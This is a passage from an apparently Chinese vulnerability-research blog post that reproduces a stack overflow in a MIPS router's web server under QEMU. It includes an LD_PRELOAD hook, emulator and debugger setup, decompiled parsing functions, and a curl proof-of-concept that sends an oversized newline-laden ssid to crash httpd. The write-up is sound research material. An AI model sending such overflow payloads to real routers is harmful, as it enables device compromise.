class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HOOK: system(\"%s\")"</span>,command);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1337</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -shared -fPIC hook.c -o hook</span><br></pre></td></tr></tbody></table></figure><p>把hook传到qemu</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r hook root@192.168.123.7:~/</span><br></pre></td></tr></tbody></table></figure><p>再重新挂载更换root</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@debian-mips:~# cp hook squashfs-root/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">挂载文件系统</span></span><br><span class="line">root@debian-mips:~# mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">root@debian-mips:~# mount --bind /proc squashfs-root/proc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">更换root目录</span></span><br><span class="line">root@debian-mips:~/squashfs-root# chroot . bin/sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在文件系统根目录</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#   LD_PRELOAD="/hook" /usr/bin/httpd</span></span><br><span class="line">  /usr/<span class="built_in">bin</span>/httpd: can<span class="string">'t load library '</span>libc.so<span class="number">.6</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 使用软链接解决</span></span><br><span class="line"><span class="string">#   ln -s lib/libc.so.0 lib/libc.so.6</span></span><br><span class="line"><span class="string">#   LD_PRELOAD="/hook" /usr/bin/httpd</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241129224536063.png" alt="image-20241129224536063"></p><p>把gdbserver复制到qemu</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo scp -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -r /home/hpp/embedded-tools/binaries/gdbserver/gdbserver.mipsbe root@<span class="number">192.168</span><span class="number">.123</span><span class="number">.7</span>:~/squashfs-root/</span><br></pre></td></tr></tbody></table></figure><p>使用gdbserver将httpd调试转发到2333端口</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># LD_PRELOAD="/hook"</span></span><br><span class="line"><span class="comment"># ./gdbserver.mipsbe 0.0.0.0:1234  /usr/bin/httpd</span></span><br></pre></td></tr></tbody></table></figure><p>试了好久，一直看不到qemu开了80端口，后来无缘无故就可以了</p><p>可以清一下cookie</p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241202215550871.png" alt="image-20241202215550871"></p><p>获取cookie和path</p><p>cookie <code>Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D</code></p><p>path <code>RSSCTKQCPJFJLXVB</code></p><p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241204192409432.png" alt="image-20241204192409432"></p><p>抓一下包</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D'</span> <span class="string">'http://192.168.123.7/WZJXOVKAWKKMDBGB/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&amp;curRegion=1000&amp;chanWidth=100&amp;channel=1000&amp;ssid='</span>$(python -c <span class="string">'print( "/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac")'</span>)<span class="string">''</span></span><br></pre></td></tr></tbody></table></figure><p><strong>Mips常用命令</strong></p><div class="table-container"><table><thead><tr><th>命令</th><th>格式</th><th>用途</th></tr></thead><tbody><tr><td>lw</td><td>lw R1, 0(R2)</td><td>从存储器中读取一个word存储（Load）到register中</td></tr><tr><td>sw</td><td>sw R1, 0(R2)</td><td>把一个word从register中存储（store）到存储器中</td></tr><tr><td>addiu</td><td>addiu R1,R2,#3</td><td>将一个立即数#3加上R2内容之后存放到目标地址R1</td></tr><tr><td>or</td><td>or R1,R2,R3</td><td>两个寄存器内容相或</td></tr><tr><td>jalr</td><td>jalr R1</td><td>使用寄存器的跳转指令</td></tr></tbody></table></div><p>MIPS寄存器功能</p><div class="table-container"><table><thead><tr><th>REGISTER</th><th>NAME</th><th>USAGE</th></tr></thead><tbody><tr><td><code>$0</code></td><td><code>$zero</code></td><td>常量0(constant value 0)</td></tr><tr><td><code>$1</code></td><td><code>$at</code></td><td>保留给汇编器(Reserved for assembler)</td></tr><tr><td><code>$2-$3</code></td><td><code>$v0-$v1</code></td><td>函数调用返回值(values for results and expression evaluation)</td></tr><tr><td><code>$4-$7</code></td><td><code>$a0-$a3</code></td><td>函数调用参数(arguments)</td></tr><tr><td><code>$8-$15</code></td><td><code>$t0-$t7</code></td><td>暂时的(或随便用的)</td></tr><tr><td><code>$16-$23</code></td><td><code>$s0-$s7</code></td><td>保存的(或如果用，需要SAVE/RESTORE的)(saved)</td></tr><tr><td><code>$24-$25</code></td><td><code>$t8-$t9</code></td><td>暂时的(或随便用的)</td></tr><tr><td><code>$28</code></td><td><code>$gp</code></td><td>全局指针(Global Pointer)</td></tr><tr><td><code>$29</code></td><td><code>$sp</code></td><td>堆栈指针(Stack Pointer)</td></tr><tr><td><code>$30</code></td><td><code>$fp</code></td><td>帧指针(Frame Pointer)</td></tr><tr><td><code>$31</code></td><td><code>$ra</code></td><td>返回地址(return address)</td></tr></tbody></table></div><p>mips里的叶子函数和非叶子函数</p><p>叶子函数就是在函数里没有调用其他的函数，返回地址没有压入栈中，而是直接存入寄存器$ra中，<strong>非叶子函数</strong> ，即函数中还调用了其他函数，返回地址在栈中</p><p>mips没有栈底指针，只有一个$sp指向栈顶，没有pop 和push调整指针，而是采用偏移寻址来访问变量</p><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h5><p>pwndbg一直调试不了，搞了很久，还是直接看代码吧</p><p>在stringModify字符串转化函数，存在栈溢出漏洞</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这函数是将字符串a3转化复制给a1字符串</span></span><br><span class="line"><span class="comment">//删减版</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">stringModify</span><span class="params">(_BYTE *a1, <span class="type">int</span> size, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// dc</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $v1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">//初始化a3,将地址转给v4，</span></span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  v4 = (<span class="type">char</span> *)(a3 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    v7 = *(v4 - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !*(v4 - <span class="number">1</span>) || v5 &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//当是  '/'  '&gt;'  '&lt;'  '\\'(反斜杠的表示方式，算一字节)</span></span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">'/'</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &gt;= <span class="string">'0'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> (v7 == <span class="string">'&gt;'</span> || v7 == <span class="string">'\\'</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_18:</span><br><span class="line">        *a1 = <span class="string">'\\'</span>;</span><br><span class="line">LABEL_19:</span><br><span class="line">        ++v5;</span><br><span class="line">        ++a1;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v7 == <span class="string">'&lt;'</span> )</span><br><span class="line">      {</span><br><span class="line">        *a1 = <span class="string">'\\'</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      }</span><br><span class="line"><span class="comment">//复制的字符必会经过这</span></span><br><span class="line">LABEL_20:</span><br><span class="line">      ++v5;</span><br><span class="line">      *a1++ = *(v4 - <span class="number">1</span>);   <span class="comment">//将其下一字节等于其本身，即转化前的字符</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      }</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="string">'\r'</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v7 == <span class="string">'"'</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      <span class="keyword">if</span> ( v7 != <span class="string">'\n'</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">    }</span><br><span class="line">    v6 = *v4;</span><br><span class="line">      <span class="comment">//等于换行符时</span></span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="string">'\r'</span> &amp;&amp; v6 != <span class="string">'\n'</span> )</span><br><span class="line">    {</span><br><span class="line">      qmemcpy(a1, <span class="string">"&lt;br&gt;"</span>, <span class="number">4</span>);</span><br><span class="line">      a1 += <span class="number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    ++v5;</span><br><span class="line">LABEL_21:</span><br><span class="line">    ++v4;</span><br><span class="line">  }</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>如果字符等于 <code>/ &gt;  &lt;  \\  "</code> 这几个字符转成  \  + <code>/或&gt;...</code>,同时v5计数是2</p><p>如果字符等于 <strong>\r  \n</strong> 等换行符，会把  &lt;<strong>br</strong>&gt; 复制到a1，并且v5只加1，理论上最多可以把原始的字符长度复制成原来的四倍，会有栈溢出</p><p><strong>writePageParamSet</strong> 函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">writePageParamSet</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $a3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// $a0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> *v10; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+14h] [-204h]</span></span><br><span class="line">  <span class="type">int</span> v13[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-200h] BYREF</span></span><br><span class="line">  <span class="keyword">if</span> ( !a3 )</span><br><span class="line">    HTTP_DEBUG_PRINT(<span class="string">"basicWeb/httpWebV3Common.c:178"</span>, <span class="string">"Never Write NULL to page, %s, %d"</span>, <span class="string">"writePageParamSet"</span>, <span class="number">178</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a2, <span class="string">"\"%s\","</span>, a3) )</span><br><span class="line">  {</span><br><span class="line">    result = <span class="built_in">strcmp</span>(a2, <span class="string">"%d,"</span>, v6);</span><br><span class="line">    v8 = a1;</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    v10 = *(<span class="type">int</span> **)a3;</span><br><span class="line">    v9 = a2;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">      <span class="comment">//这里调用了stringModyfy函数</span></span><br><span class="line">    <span class="keyword">if</span> ( stringModify(v13, <span class="number">0x200</span>, (<span class="type">int</span>)a3) &lt; <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"string modify error!"</span>);</span><br><span class="line">      HIBYTE(v13[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    v8 = a1;</span><br><span class="line">    v9 = a2;</span><br><span class="line">    v10 = v13;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> httpPrintf(v8, v9, (<span class="type">int</span>)v10, v7, (<span class="type">int</span>)&amp;unk_594D80, v12, v13[<span class="number">0</span>], v13[<span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>交叉编译，发现<strong>sub_45FA94 </strong> 调用的<strong>sub_45eb48</strong> 函数里调用了<strong>writePageParamSet</strong> 函数，不知道师傅们是怎么找到这的。ssid对应着下面的<strong>writePageParamSet(int a1, int a2, const char *a3)</strong> 第三个参数。这个函数把ssid放到一个很小的 <strong>v57</strong> 数组里</p><p>来仔细分析一下这个关键函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删减过</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_45EB48</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  </span><br><span class="line">  _DWORD v57[<span class="number">17</span>]; <span class="comment">// [sp+CCh] [-D5Ch] BYREF</span></span><br><span class="line">  _DWORD v58[<span class="number">94</span>]; <span class="comment">// [sp+110h] [-D18h] BYREF</span></span><br><span class="line">  _BYTE v59[<span class="number">2952</span>]; <span class="comment">// [sp+288h] [-BA0h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *Env; <span class="comment">// [sp+E10h] [-18h]</span></span><br><span class="line">  <span class="type">int</span> *v61; <span class="comment">// [sp+E14h] [-14h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v62; <span class="comment">// [sp+E18h] [-10h]</span></span><br><span class="line">  _BYTE *v63; <span class="comment">// [sp+E1Ch] [-Ch]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v64; <span class="comment">// [sp+E20h] [-8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v65; <span class="comment">// [sp+E24h] [-4h]</span></span><br><span class="line">  swWlanWDSScan(a1, v56, <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//前面的删减一部分</span></span><br><span class="line">   <span class="string">'''</span></span><br><span class="line">  <span class="comment">//根据poc的输出，这里对应着前面几次的输出</span></span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"waitWdsInf"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"siteSurveyPara"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"mptBssid"</span>);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"siteList"</span>);</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line">  </span><br><span class="line">  httpPrintf(a2, <span class="string">"0,0 );\n&lt;/SCRIPT&gt;\n"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v57, <span class="number">0</span>, <span class="keyword">sizeof</span>(v57));</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//取ssid对应值的指针赋给v25，然后再把ssid复制给v54</span></span><br><span class="line">  v25 = httpGetEnv(a2, <span class="string">"ssid"</span>);  </span><br><span class="line">  v26 = v25;</span><br><span class="line">  <span class="keyword">if</span> ( v25 )</span><br><span class="line">  {</span><br><span class="line">    v27 = <span class="built_in">strlen</span>(v25);</span><br><span class="line">    <span class="built_in">strncpy</span>(v57, v26, v27);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    HIBYTE(v57[<span class="number">0</span>]) = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//下面的这几段是对应着wlanconfig的值</span></span><br><span class="line">  v28 = httpGetEnv(a2, <span class="string">"curRegion"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v28 )</span><br><span class="line">  {</span><br><span class="line">    v29 = atoi(v28);</span><br><span class="line">    i = v29;</span><br><span class="line">    <span class="keyword">if</span> ( v29 &lt; <span class="number">0x6C</span> )</span><br><span class="line">      v57[<span class="number">9</span>] = v29;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">9</span>] = <span class="number">17</span>;</span><br><span class="line">  }</span><br><span class="line">  v30 = httpGetEnv(a2, <span class="string">"channel"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v30 )</span><br><span class="line">  {</span><br><span class="line">    v31 = atoi(v30);</span><br><span class="line">    i = v31;</span><br><span class="line">    <span class="keyword">if</span> ( !a1 &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(v31 - <span class="number">1</span>) &lt; <span class="number">0xF</span> )</span><br><span class="line">      v57[<span class="number">10</span>] = v31;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a1 )</span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">10</span>] = <span class="number">6</span>;</span><br><span class="line">  }</span><br><span class="line">  v32 = httpGetEnv(a2, <span class="string">"chanWidth"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v32 )</span><br><span class="line">  {</span><br><span class="line">    v33 = atoi(v32);</span><br><span class="line">    i = v33;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v33 - <span class="number">1</span>) &lt; <span class="number">3</span> )</span><br><span class="line">      v57[<span class="number">11</span>] = v33;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">11</span>] = <span class="number">2</span>;</span><br><span class="line">  }</span><br><span class="line">  v34 = httpGetEnv(a2, <span class="string">"mode"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v34 )</span><br><span class="line">  {</span><br><span class="line">    v35 = atoi(v34);</span><br><span class="line">    i = v35;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v35 - <span class="number">1</span>) &lt; <span class="number">8</span> )</span><br><span class="line">      v57[<span class="number">12</span>] = v35;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v57[<span class="number">12</span>] = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//下面的值不用设置，不然产生\x00截断</span></span><br><span class="line">  v36 = httpGetEnv(a2, <span class="string">"wrr"</span>);</span><br><span class="line">  v37 = v36;</span><br><span class="line">  <span class="keyword">if</span> ( v36 )</span><br><span class="line">    v57[<span class="number">13</span>] = !<span class="built_in">strcmp</span>(v36, <span class="string">"true"</span>) || atoi(v37) == <span class="number">1</span>;</span><br><span class="line">  v38 = httpGetEnv(a2, <span class="string">"sb"</span>);</span><br><span class="line">  v39 = v38;</span><br><span class="line">  <span class="keyword">if</span> ( v38 )</span><br><span class="line">    v57[<span class="number">14</span>] = !<span class="built_in">strcmp</span>(v38, <span class="string">"true"</span>) || atoi(v39) == <span class="number">1</span>;</span><br><span class="line">  v40 = httpGetEnv(a2, <span class="string">"select"</span>);</span><br><span class="line">  v41 = v40;</span><br><span class="line">  <span class="keyword">if</span> ( v40 )</span><br><span class="line">    v57[<span class="number">15</span>] = !<span class="built_in">strcmp</span>(v40, <span class="string">"true"</span>) || atoi(v41) == <span class="number">1</span>;</span><br><span class="line">  v42 = httpGetEnv(a2, <span class="string">"rate"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v42 )</span><br><span class="line">    v57[<span class="number">16</span>] = atoi(v42);</span><br><span class="line">  httpPrintf(a2, <span class="string">"&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n"</span>, <span class="string">"pagePara"</span>);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"\"%s\","</span>, (<span class="type">const</span> <span class="type">char</span> *)v57);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">9</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">10</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">11</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">12</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span class="type">int</span>)<span class="string">"%d,"</span>, (<span class="type">const</span> <span class="type">char</span> *)&amp;v57[<span class="number">13</span>]);</span><br><span class="line">  writePageParamSet(a2, (<span 